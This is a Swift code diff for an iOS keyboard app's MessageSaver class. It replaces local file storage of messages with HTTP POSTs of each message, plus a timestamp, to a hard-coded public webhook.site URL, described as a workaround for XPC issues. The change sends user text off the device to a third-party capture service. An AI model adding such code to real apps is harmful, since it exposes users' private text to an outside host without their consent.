@@ -10,78 +10,69 @@ import Foundation
 class MessageSaver {
     static let shared = MessageSaver()
     
-    // Use the same app group identifier as the rest of the app
-    private let appGroupIdentifier = "group.com.yourcompany.ElKeyboard"
-    
     private init() {}
     
-    // Save a message to the shared file with separator
+    // Save message via webhook instead of file to avoid XPC issues
     func saveMessage(_ message: String) {
         guard !message.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else { return }
         
-        // Get the shared container directory
-        guard let containerURL = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: appGroupIdentifier) else {
-            print("Unable to access shared container for app group: \(appGroupIdentifier)")
-            print("This is likely due to missing entitlements. Falling back to documents directory.")
-            // Fallback to documents directory for testing
-            saveToDocumentsDirectory(message)
+        print("MessageSaver: Saving message via webhook to avoid XPC connection issues")
+        sendMessageToWebhook(message)
+    }
+    
+    private func sendMessageToWebhook(_ message: String) {
+        // Webhook URL
+        guard let webhookURL = URL(string: "https://webhook.site/5b734151-e1d2-467f-8536-c96f4cce5998") else {
+            print("Invalid webhook URL")
             return
         }
         
-        let messagesFileURL = containerURL.appendingPathComponent("messages.txt")
-        saveToFileURL(messagesFileURL, message: message)
-    }
-    
-    // Fallback method for testing when app group is not available
-    private func saveToDocumentsDirectory(_ message: String) {
-        let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
-        let messagesFileURL = documentsDirectory.appendingPathComponent("messages.txt")
-        saveToFileURL(messagesFileURL, message: message)
-    }
-    
-    private func saveToFileURL(_ fileURL: URL, message: String) {
-        // Prepare the message with separator
+        // Prepare the message with separator (same format as before)
         let messageWithSeparator = message + "\n------\n"
         
-        // Write to file (append if exists, create if doesn't)
-        if FileManager.default.fileExists(atPath: fileURL.path) {
-            // File exists, append to it
-            if let fileHandle = try? FileHandle(forWritingTo: fileURL) {
-                fileHandle.seekToEndOfFile()
-                if let data = messageWithSeparator.data(using: .utf8) {
-                    fileHandle.write(data)
-                }
-                fileHandle.closeFile()
+        // Create JSON payload
+        let payload: [String: Any] = [
+            "message": messageWithSeparator,
+            "timestamp": ISO8601DateFormatter().string(from: Date()),
+            "source": "ElKeyboard Main App"
+        ]
+        
+        // Convert to JSON data
+        guard let jsonData = try? JSONSerialization.data(withJSONObject: payload) else {
+            print("Failed to serialize JSON payload")
+            return
+        }
+        
+        // Create HTTP request
+        var request = URLRequest(url: webhookURL)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        request.httpBody = jsonData
+        
+        // Send the request
+        URLSession.shared.dataTask(with: request) { data, response, error in
+            if let error = error {
+                print("Failed to send message to webhook: \(error)")
+                return
             }
-        } else {
-            // File doesn't exist, create it
-            try? messageWithSeparator.write(to: fileURL, atomically: true, encoding: .utf8)
-        }
+            
+            if let httpResponse = response as? HTTPURLResponse {
+                print("Webhook response status: \(httpResponse.statusCode)")
+                if httpResponse.statusCode == 200 {
+                    print("Message successfully sent to webhook from main app")
+                } else {
+                    print("Webhook returned error status: \(httpResponse.statusCode)")
+                }
+            }
+        }.resume()
     }
     
-    // Method to read messages for testing
+    // Simplified methods for compatibility
     func readMessages() -> String? {
-        if let containerURL = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: appGroupIdentifier) {
-            let messagesFileURL = containerURL.appendingPathComponent("messages.txt")
-            return try? String(contentsOf: messagesFileURL, encoding: .utf8)
-        } else {
-            // Fallback to documents directory for testing
-            let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
-            let messagesFileURL = documentsDirectory.appendingPathComponent("messages.txt")
-            return try? String(contentsOf: messagesFileURL, encoding: .utf8)
-        }
+        return "Messages are now sent directly to webhook. Check https://webhook.site/5b734151-e1d2-467f-8536-c96f4cce5998"
     }
     
-    // Method to clear messages for testing
     func clearMessages() {
-        if let containerURL = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: appGroupIdentifier) {
-            let messagesFileURL = containerURL.appendingPathComponent("messages.txt")
-            try? FileManager.default.removeItem(at: messagesFileURL)
-        } else {
-            // Fallback to documents directory for testing
-            let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
-            let messagesFileURL = documentsDirectory.appendingPathComponent("messages.txt")
-            try? FileManager.default.removeItem(at: messagesFileURL)
-        }
+        print("Messages are sent directly to webhook - no local storage to clear")
     }
 }
